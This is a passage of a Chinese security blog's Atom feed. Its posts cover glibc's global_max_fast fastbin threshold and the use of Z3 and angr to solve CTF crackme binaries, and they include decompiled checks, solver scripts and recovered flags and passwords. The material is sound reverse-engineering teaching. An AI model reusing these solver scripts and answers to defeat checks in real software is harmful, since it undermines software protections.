<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>nocbtm&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://nocbtm.github.io/"/>
  <updated>2019-10-04T05:27:47.872Z</updated>
  <id>https://nocbtm.github.io/</id>
  
  <author>
    <name>nocbtm</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>global_max_fast相关利用</title>
    <link href="https://nocbtm.github.io/2019/10/04/global-max-fast%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8/"/>
    <id>https://nocbtm.github.io/2019/10/04/global-max-fast相关利用/</id>
    <published>2019-10-04T05:23:04.000Z</published>
    <updated>2019-10-04T05:27:47.872Z</updated>
    
    <content type="html"><![CDATA[<h2 id="global-max-fas"><a href="#global-max-fas" class="headerlink" title="global_max_fas"></a>global_max_fas</h2><p>global_max_fast这个全局变量的作用是用来标志fastbin的大小的阈值，小于这个值的堆块会被认为是fastbin，使用fastbin的相应机制进行管理。在glibc-2.23中看下它的定义：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_max_fast(s) \</span></span><br><span class="line">  global_max_fast = (((s) == <span class="number">0</span>)                           \</span><br><span class="line">                     ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="line">#define get_max_fast() global_max_fast</span><br></pre></td></tr></table></figure></p><p>set_max_fast初始化函数开始是在malloc_init_state调用的，可以看到这个宏定义的作用是设置global_max_fast默认值，默认值是0x80。</p><p>然后看malloc中对于fastbin的处理，fastbin处理很简单，就是找到对应的fastbin的单链表，并从中取出堆块，如果size检查通过就将该堆块返回：</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;global-max-fas&quot;&gt;&lt;a href=&quot;#global-max-fas&quot; class=&quot;headerlink&quot; title=&quot;global_max_fas&quot;&gt;&lt;/a&gt;global_max_fas&lt;/h2&gt;&lt;p&gt;global_max_fast这个全局变量的
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>z3求解器</title>
    <link href="https://nocbtm.github.io/2019/10/03/z3%E6%B1%82%E8%A7%A3%E5%99%A8/"/>
    <id>https://nocbtm.github.io/2019/10/03/z3求解器/</id>
    <published>2019-10-03T06:24:37.000Z</published>
    <updated>2019-10-03T07:45:00.146Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Z3是一个微软出品的开源约束求解器，能够解决很多种情况下的给定部分约束条件寻求一组满足条件的解的问题（可以简单理解为解方程的感觉，虽然这么比喻其实还差距甚远，请勿吐槽），功能强大且易于使用。<br>Z3 在工业应用中实际上常见于软件验证、程序分析等。然而由于功能实在强大，也被用于很多其他领域。CTF 领域来说，能够用约束求解器搞定的问题常见于密码题、二进制逆向、符号执行、Fuzzing 模糊测试等。此外，著名的二进制分析框架 angr 也内置了一个修改版的 Z3。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>这里我用的是angr里面的z3，<a href="https://nocbtm.github.io/2019/10/02/docker%E5%AE%89%E8%A3%85angr/">安装教程</a>。</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">x = Int(<span class="string">'x'</span>)</span><br><span class="line">y = Int(<span class="string">'y'</span>)</span><br><span class="line">solve(x &gt; <span class="number">2</span>, y &lt; <span class="number">10</span>, x + <span class="number">2</span>*y == <span class="number">7</span>)</span><br></pre></td></tr></table></figure><p>上面的例子中，定义了两个变量：x 和 y。类型为 Int（注意这里的 Int 可不是 C/C++ 里面包含上下界的 int，Z3 中的 Int 对应的就是数学中的整数，Z3 中的 BitVector 才对应到 C/C++ 中的 int）。</p><p>然后就调用了 solve 函数求解三个条件下的满足模型，这三个条件分别是 x 大于 2，y 小于 10，并且 x 加 2 个 y 等于 7。</p><p>运行一下结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(angr) angr@36aeab92fea7:~/z3$ python test.py </span><br><span class="line">[y = 0, x = 7]</span><br></pre></td></tr></table></figure><h2 id="ctf实例"><a href="#ctf实例" class="headerlink" title="ctf实例"></a>ctf实例</h2><h3 id="某比赛中的逆向题"><a href="#某比赛中的逆向题" class="headerlink" title="某比赛中的逆向题"></a>某比赛中的逆向题</h3><p>首先我们利用IDA去打开该文件，定位到关键点，发现关键函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">sub_400766</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_6020A0) != <span class="number">32</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  v3 = stru_6020A0.y1;</span><br><span class="line">  v4 = stru_6020A0.y2;</span><br><span class="line">  v5 = stru_6020A0.y3;</span><br><span class="line">  v6 = stru_6020A0.y4;</span><br><span class="line">  <span class="keyword">if</span> ( stru_6020A0.x2 * (<span class="keyword">signed</span> __int64)stru_6020A0.x1 - stru_6020A0.x4 * (<span class="keyword">signed</span> __int64)stru_6020A0.x3 != <span class="number">0x24CDF2E7C953DA56</span>LL )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3L</span>L * stru_6020A0.x3 + <span class="number">4L</span>L * stru_6020A0.x4 - stru_6020A0.x2 - <span class="number">2L</span>L * stru_6020A0.x1 != <span class="number">0x17B85F06</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3</span> * stru_6020A0.x1 * (<span class="keyword">signed</span> __int64)stru_6020A0.x4 - stru_6020A0.x3 * (<span class="keyword">signed</span> __int64)stru_6020A0.x2 != <span class="number">0x2E6E497E6415CF3E</span>LL )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">27L</span>L * stru_6020A0.x2 + stru_6020A0.x1 - <span class="number">11L</span>L * stru_6020A0.x4 - stru_6020A0.x3 != <span class="number">0x95AE13337</span>LL )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  srand(stru_6020A0.x3 ^ stru_6020A0.x2 ^ stru_6020A0.x1 ^ stru_6020A0.x4);</span><br><span class="line">  v1 = rand() % <span class="number">50</span>;</span><br><span class="line">  v2 = rand() % <span class="number">50</span>;</span><br><span class="line">  v7 = rand() % <span class="number">50</span>;</span><br><span class="line">  v8 = rand() % <span class="number">50</span>;</span><br><span class="line">  v9 = rand() % <span class="number">50</span>;</span><br><span class="line">  v10 = rand() % <span class="number">50</span>;</span><br><span class="line">  v11 = rand() % <span class="number">50</span>;</span><br><span class="line">  v12 = rand() % <span class="number">50</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v6 * v2 + v3 * v1 - v4 - v5 != <span class="number">0xE638C96D3</span>LL</span><br><span class="line">    || v6 + v3 + v5 * v8 - v4 * v7 != <span class="number">0xB59F2D0CB</span>LL</span><br><span class="line">    || v3 * v9 + v4 * v10 - v5 - v6 != <span class="number">0xDCFE88C6D</span>LL</span><br><span class="line">    || v5 * v12 + v3 - v4 - v6 * v11 != <span class="number">0xC076D98BB</span>LL )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_15:</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看得出来这个题目的目的就是找出满足方程的flag。我们可以很方便的把方程式列出来，但是求解对于一些数学不是很好的人来说简直就是噩梦，这时候Z3求解器就可以很方便的给我们帮助。我们按照题目的意思一步一步利用Z3求解器来求解：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">x1 = Int(<span class="string">'x1'</span>)</span><br><span class="line">x2 = Int(<span class="string">'x2'</span>)</span><br><span class="line">x3 = Int(<span class="string">'x3'</span>)</span><br><span class="line">x4 = Int(<span class="string">'x4'</span>)</span><br><span class="line">s = Solver()  <span class="comment">#创建一个通用求解器</span></span><br><span class="line">s.add( x2*x1-x4*x3 == <span class="number">0x24CDF2E7C953DA56</span>)  <span class="comment">#添加约束条件</span></span><br><span class="line">s.add( <span class="number">3</span>*x3+<span class="number">4</span>*x4-x2<span class="number">-2</span>*x1 == <span class="number">0x17B85F06</span>)</span><br><span class="line">s.add( <span class="number">3</span>*x1*x4-x3*x2 == <span class="number">0x2E6E497E6415CF3E</span>)</span><br><span class="line">s.add( <span class="number">27</span>*x2+x1<span class="number">-11</span>*x4 - x3 == <span class="number">0x95AE13337</span>)</span><br><span class="line"><span class="keyword">print</span> s.check()   <span class="comment">#检查是否有解，sat结果表示找到某个合适的解，unsat结果表示没有解</span></span><br><span class="line">m = s.model()    <span class="comment">#得到一组解，m为字典类型</span></span><br><span class="line"><span class="keyword">print</span> m</span><br><span class="line"><span class="keyword">print</span> <span class="string">"traversing model..."</span></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> m.decls():</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"%s = %s"</span> % (d.name(), m[d])</span><br></pre></td></tr></table></figure></p><h3 id="第八届极客大挑战的REConvolution"><a href="#第八届极客大挑战的REConvolution" class="headerlink" title="第八届极客大挑战的REConvolution"></a>第八届极客大挑战的REConvolution</h3><p>我们打开文件，也是比较直观的看到约束条件，我试着逆向了这个过程，花费了挺多的时间才得到答案，但是如果我们使用Z3Py来求解的话就会非常的快。</p><p>函数关键部分如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> ii; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// kr00_4</span></span><br><span class="line">  <span class="keyword">char</span> flag_i; <span class="comment">// bl</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> jj; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> xor_result[<span class="number">80</span>]; <span class="comment">// [esp+8h] [ebp-A4h]</span></span><br><span class="line">  <span class="keyword">char</span> flag[<span class="number">80</span>]; <span class="comment">// [esp+58h] [ebp-54h]</span></span><br><span class="line">  sub_DC1020(<span class="string">"Please input your flag: "</span>);</span><br><span class="line">  sub_DC1050(<span class="string">"%40s"</span>, flag);</span><br><span class="line">  <span class="built_in">memset</span>(xor_result, <span class="number">0</span>, <span class="number">0x50</span>u);</span><br><span class="line">  ii = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(flag);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      flag_i = flag[ii];</span><br><span class="line">      jj = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v7 = &amp;xor_result[jj + ii];</span><br><span class="line">        v8 = flag_i ^ data1[jj++];</span><br><span class="line">        *v7 += v8;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( jj &lt; <span class="number">0x20</span> );</span><br><span class="line">      ++ii;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( ii &lt; v4 );</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = <span class="built_in">strcmp</span>(xor_result, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;data2);</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">    v9 = -(v9 &lt; <span class="number">0</span>) | <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No, it isn't."</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Yes, it is."</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们利用Z3Py来进行变量的声明和约束的增加并进行求解<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python2</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s = Solver()</span><br><span class="line">X =  [BitVec((<span class="string">'x%s'</span> % i),<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x22</span>) ]   <span class="comment">#生成34个8比特的数</span></span><br><span class="line"><span class="keyword">print</span> X</span><br><span class="line">data1 =  [<span class="number">0x21</span>,<span class="number">0x22</span>,<span class="number">0x23</span>,<span class="number">0x24</span>,<span class="number">0x25</span>,<span class="number">0x26</span>,<span class="number">0x27</span>,<span class="number">0x28</span>,<span class="number">0x29</span>,<span class="number">0x2A</span>,<span class="number">0x2B</span>,<span class="number">0x2C</span>,<span class="number">0x2D</span>,<span class="number">0x2E</span>,<span class="number">0x2F</span>,<span class="number">0x3A</span>,</span><br><span class="line"><span class="number">0x3B</span>,<span class="number">0x3C</span>,<span class="number">0x3D</span>,<span class="number">0x3E</span>,<span class="number">0x3F</span>,<span class="number">0x40</span>,<span class="number">0x5B</span>,<span class="number">0x5C</span>,<span class="number">0x5D</span>,<span class="number">0x5E</span>,<span class="number">0x5F</span>,<span class="number">0x60</span>,<span class="number">0x7B</span>,<span class="number">0x7C</span>,<span class="number">0x7D</span>,<span class="number">0x7E</span>]</span><br><span class="line">data2 = [<span class="number">0x72</span>,<span class="number">0xE9</span>,<span class="number">0x4D</span>,<span class="number">0xAC</span>,<span class="number">0xC1</span>,<span class="number">0xD0</span>,<span class="number">0x24</span>,<span class="number">0x6B</span>,<span class="number">0xB2</span>,<span class="number">0xF5</span>,<span class="number">0xFD</span>,<span class="number">0x45</span>,<span class="number">0x49</span>,<span class="number">0x94</span>,<span class="number">0xDC</span>,<span class="number">0x10</span>,</span><br><span class="line"><span class="number">0x10</span>,<span class="number">0x6B</span>,<span class="number">0xA3</span>,<span class="number">0xFB</span>,<span class="number">0x5C</span>,<span class="number">0x13</span>,<span class="number">0x17</span>,<span class="number">0xE4</span>,<span class="number">0x67</span>,<span class="number">0xFE</span>,<span class="number">0x72</span>,<span class="number">0xA1</span>,<span class="number">0xC7</span>,<span class="number">0x04</span>,<span class="number">0x2B</span>,<span class="number">0xC2</span>,</span><br><span class="line"><span class="number">0x9D</span>,<span class="number">0x3F</span>,<span class="number">0xA7</span>,<span class="number">0x6C</span>,<span class="number">0xE7</span>,<span class="number">0xD0</span>,<span class="number">0x90</span>,<span class="number">0x71</span>,<span class="number">0x36</span>,<span class="number">0xB3</span>,<span class="number">0xAB</span>,<span class="number">0x67</span>,<span class="number">0xBF</span>,<span class="number">0x60</span>,<span class="number">0x30</span>,<span class="number">0x3E</span>,</span><br><span class="line"><span class="number">0x78</span>,<span class="number">0xCD</span>,<span class="number">0x6D</span>,<span class="number">0x35</span>,<span class="number">0xC8</span>,<span class="number">0x55</span>,<span class="number">0xFF</span>,<span class="number">0xC0</span>,<span class="number">0x95</span>,<span class="number">0x62</span>,<span class="number">0xE6</span>,<span class="number">0xBB</span>,<span class="number">0x57</span>,<span class="number">0x34</span>,<span class="number">0x29</span>,<span class="number">0x0E</span>,<span class="number">3</span>]</span><br><span class="line">xor_result = [<span class="number">0</span>]*<span class="number">0x41</span></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x22</span>):</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x20</span>):</span><br><span class="line">        xor_result[n+m] += X[m] ^ data1[n]</span><br><span class="line"><span class="keyword">for</span> o <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x41</span>):          <span class="comment">#循环添加约束条件</span></span><br><span class="line">    s.add(xor_result[o] == data2[o])   </span><br><span class="line"><span class="keyword">print</span> s.check()</span><br><span class="line">m = s.model()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"traversing model..."</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x22</span>):</span><br><span class="line">    flag+=chr(int(<span class="string">"%s"</span> % (m[X[i]])))</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure></p><p>执行脚本如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(angr) angr@36aeab92fea7:~/z3$ python exp2.py </span><br><span class="line">[x0, x1, x2, x3, x4, x5, x6, x7, x8, x9, x10, x11, x12, x13, x14, x15, x16, x17, x18, x19, x20, x21, x22, x23, x24, x25, x26, x27, x28, x29, x30, x31, x32, x33]</span><br><span class="line">sat</span><br><span class="line">traversing model...</span><br><span class="line">SYC&#123;4+mile+b3gin+with+sing1e+step&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;Z3是一个微软出品的开源约束求解器，能够解决很多种情况下的给定部分约束条件寻求一组满足条件的解的问题（可以简单理解为解方程的感觉，虽然这么比
      
    
    </summary>
    
      <category term="reverse" scheme="https://nocbtm.github.io/categories/reverse/"/>
    
    
      <category term="reverse" scheme="https://nocbtm.github.io/tags/reverse/"/>
    
  </entry>
  
  <entry>
    <title>angr符号执行</title>
    <link href="https://nocbtm.github.io/2019/10/02/angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"/>
    <id>https://nocbtm.github.io/2019/10/02/angr符号执行/</id>
    <published>2019-10-02T09:20:42.000Z</published>
    <updated>2019-10-02T10:43:48.568Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>符号执行简单来说就是用符号来模拟程序执行，在我看来就相当于暴力破解，比如一个程序要求你进行一个复杂的运算，每次动态调试只能输入一次，然而符合执行可以尽可能的遍历每一条路径，这样就方便了许多，<a href="http://angr.io/api-doc/claripy.html" target="_blank" rel="noopener">官方学习文档</a>。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>这里不建议实体机安装，坑太多，直接上docker，<a href="https://nocbtm.github.io/2019/10/02/docker%E5%AE%89%E8%A3%85angr/">安装教程</a></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="r100-defcamp"><a href="#r100-defcamp" class="headerlink" title="r100(defcamp)"></a>r100(defcamp)</h3><p>题目和脚本docker里面都有,将程序载入IDA静态分析，主函数如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter the password: "</span>, a2, a3);</span><br><span class="line">  <span class="keyword">if</span> ( !fgets(&amp;s, <span class="number">255</span>, <span class="built_in">stdin</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_4006FD((__int64)&amp;s) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Incorrect password!"</span>);</span><br><span class="line">    result = <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Nice!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>加密函数如下，因为我们这里用符号执行来做，所以不进行算法分析<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">sub_4006FD</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// [rsp+18h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// [rsp+20h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v5; <span class="comment">// [rsp+28h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="string">"Dufhbmf"</span>;</span><br><span class="line">  v4 = <span class="string">"pG`imos"</span>;</span><br><span class="line">  v5 = <span class="string">"ewUglpt"</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (&amp;v3)[i % <span class="number">3</span>][<span class="number">2</span> * (i / <span class="number">3</span>)] - *(<span class="keyword">char</span> *)(i + a1) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>需要知道的是，程序有两个分支，输入密码后会进行判断，正确输出nice，错误输入wrong，我们希望的是输出nice，那么这里就可以进行用符号执行来做。先直观感受一下脚本，我们希望执行0x400844中的内容，不希望执行0x400855的内容，脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    p = angr.Project(<span class="string">"r100"</span>, load_options=&#123;<span class="string">'auto_load_libs'</span>: <span class="keyword">False</span>&#125;) <span class="comment"># 加载程序</span></span><br><span class="line"><span class="comment">#约束执行的流程，0x400844为打印nice附近的地址，0x400855附近即为打印错误的地址</span></span><br><span class="line">    ex = p.surveyors.Explorer(find=(<span class="number">0x400844</span>, ), avoid=(<span class="number">0x400855</span>,)) </span><br><span class="line">    ex.run() </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ex.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>).strip(<span class="string">'\0\n'</span>) <span class="comment"># 打印found的第一个结果</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> main() == <span class="string">'Code_Talkers'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">print</span> main()</span><br></pre></td></tr></table></figure></p><h3 id="crackme-ais3"><a href="#crackme-ais3" class="headerlink" title="crackme(ais3)"></a>crackme(ais3)</h3><p>同样载入IDA看主函数：<br><figure class="highlight c"><table><tr><td 